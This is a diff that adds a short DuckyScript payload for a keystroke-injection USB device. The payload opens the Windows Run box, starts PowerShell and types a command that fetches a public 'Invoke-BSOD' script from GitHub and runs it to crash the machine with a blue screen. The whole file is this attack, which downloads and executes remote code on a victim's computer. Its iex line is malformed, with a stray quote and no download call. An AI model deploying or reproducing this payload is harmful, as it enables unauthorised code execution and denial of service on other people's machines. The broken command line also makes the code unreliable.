@@ -1,0 +1,12 @@
+REM BSOD
+REM -------------------------------------------------
+
+GUI r
+DELAY 1000
+STRING powershell
+ENTER
+
+DELAY 2000
+STRING iex https://raw.githubusercontent.com/peewpw/Invoke-BSOD/master/Invoke-BSOD.ps1';Invoke-BSOD
+REM this gets the script 
+ENTER
